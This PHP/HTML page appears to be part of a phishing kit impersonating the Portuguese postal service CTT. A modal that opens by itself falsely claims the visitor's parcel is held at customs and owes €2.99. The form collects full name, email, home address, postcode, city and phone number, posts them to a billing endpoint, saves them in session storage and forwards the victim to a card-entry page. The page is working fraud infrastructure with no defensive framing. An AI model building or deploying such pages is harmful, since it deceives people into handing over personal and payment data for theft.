<?php
session_start();
require_once 'includes/header.php';
?>

<div class="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
    <div class="bg-white shadow-lg border-0 rounded-lg overflow-hidden">
        <div class="p-8">
            <!-- Form Header -->
            <div class="flex items-center mb-8">
                <svg class="w-5 h-5 text-red-600 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L5.082 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
                </svg>
                <h2 class="text-xl font-semibold text-gray-900">
                    Informações de entrega
                </h2>
            </div>

            <!-- Form Fields -->
            <form id="billingForm">
                <div class="space-y-6">
                    <!-- Nome -->
                    <div class="space-y-2">
                        <label for="nome" class="text-sm font-medium text-gray-700">
                            Nome <span class="text-red-500">*</span>
                        </label>
                        <input
                            id="nome"
                            name="nome"
                            type="text"
                            required
                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                            placeholder="Nome completo"
                        />
                    </div>

                    <!-- Email -->
                    <div class="space-y-2">
                        <label for="email" class="text-sm font-medium text-gray-700">
                            Correio electrónico <span class="text-red-500">*</span>
                        </label>
                        <input
                            id="email"
                            name="email"
                            type="email"
                            required
                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                            placeholder="exemplo@email.com"
                        />
                    </div>

                    <!-- Endereço -->
                    <div class="space-y-2">
                        <label for="endereco" class="text-sm font-medium text-gray-700">
                            Endereço <span class="text-red-500">*</span>
                        </label>
                        <input
                            id="endereco"
                            name="endereco"
                            type="text"
                            required
                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                            placeholder="Rua, número, andar"
                        />
                    </div>

                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <!-- Código Postal -->
                        <div class="space-y-2">
                            <label for="codigoPostal" class="text-sm font-medium text-gray-700">
                                Código postal <span class="text-red-500">*</span>
                            </label>
                            <input
                                id="codigoPostal"
                                name="codigoPostal"
                                type="text"
                                required
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                                placeholder="0000-000"
                            />
                        </div>

                        <!-- Cidade -->
                        <div class="space-y-2">
                            <label for="cidade" class="text-sm font-medium text-gray-700">
                                Cidade <span class="text-red-500">*</span>
                            </label>
                            <input
                                id="cidade"
                                name="cidade"
                                type="text"
                                required
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                                placeholder="Nome da cidade"
                            />
                        </div>
                    </div>

                    <!-- Telefone -->
                    <div class="space-y-2">
                        <label for="telefone" class="text-sm font-medium text-gray-700">
                            Número de telefone <span class="text-red-500">*</span>
                        </label>
                        <input
                            id="telefone"
                            name="telefone"
                            type="tel"
                            required
                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                            placeholder="+351 9XX XXX XXX"
                        />
                    </div>
                </div>

                <!-- Terms Notice -->
                <div class="mt-6 text-sm text-gray-600">
                    Ao clicar no botão "Seguinte", está a aceitar as Condições Especiais de Envio Internacional.
                </div>

                <!-- Submit Button -->
                <div class="mt-8 flex justify-end">
                    <button
                        type="submit"
                        id="submitBtn"
                        class="px-8 py-2 rounded-md font-medium transition-colors duration-200 bg-red-600 hover:bg-red-700 text-white"
                    >
                        <span id="btnText">Seguinte</span>
                        <span id="btnLoading" class="hidden">
                            <svg class="animate-spin -ml-1 mr-3 h-4 w-4 text-white inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 714 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                            </svg>
                            Processando...
                        </span>
                    </button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Customs Modal -->
<div id="customsModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
    <div class="bg-white rounded-lg shadow-xl max-w-md w-full p-6 relative">
        <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
            </svg>
        </button>
        
        <div class="text-center">
            <div class="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <span class="text-2xl">📦</span>
            </div>
            
            <h3 class="text-xl font-semibold text-gray-900 mb-4">
                A sua encomenda está na alfândega
            </h3>
            
            <p class="text-gray-600 mb-2">Caro destinatário,</p>
            
            <p class="text-gray-600 mb-4">
                Recebeu esta mensagem para o informar de que a sua 
                encomenda proveniente do estrangeiro está sujeita a 
                taxas alfandegárias.
            </p>
            
            <p class="text-gray-600 mb-6">
                Pagar a taxa aduaneira de € 2,99 antes da entrega da 
                encomenda.
            </p>
            
            <button onclick="closeModal()" class="w-full bg-red-600 hover:bg-red-700 text-white py-2 px-4 rounded-md">
                Pagar agora
            </button>
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('billingForm');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    const btnLoading = document.getElementById('btnLoading');
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const formData = new FormData(form);
        const data = Object.fromEntries(formData);
        
        console.log('Submitting billing data:', data);
        
        // Show loading state
        submitBtn.disabled = true;
        submitBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
        submitBtn.classList.remove('bg-red-600', 'hover:bg-red-700');
        btnText.classList.add('hidden');
        btnLoading.classList.remove('hidden');
        
        try {
            const response = await fetch('api/billing.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            
            console.log('Response status:', response.status);
            const result = await response.json();
            console.log('Response data:', result);
            
            if (result.status === 'success') {
                // Store data in sessionStorage
                sessionStorage.setItem('ctt_billing_data', JSON.stringify(data));
                sessionStorage.setItem('ctt_billing_id', result.billing_id);
                
                console.log('Success! Navigating to card page...');
                
                // Navigate to card page
                window.location.href = 'card.php';
            } else {
                alert('Erro: ' + result.message);
            }
        } catch (error) {
            console.error('Error:', error);
            alert('Erro ao enviar dados. Tente novamente.');
        } finally {
            // Reset loading state
            submitBtn.disabled = false;
            submitBtn.classList.remove('bg-gray-400', 'cursor-not-allowed');
            submitBtn.classList.add('bg-red-600', 'hover:bg-red-700');
            btnText.classList.remove('hidden');
            btnLoading.classList.add('hidden');
        }
    });
});

function closeModal() {
    document.getElementById('customsModal').style.display = 'none';
}

// Show modal after page loads
setTimeout(() => {
    document.getElementById('customsModal').style.display = 'flex';
}, 1000);
</script>

<?php require_once 'includes/footer.php'; ?>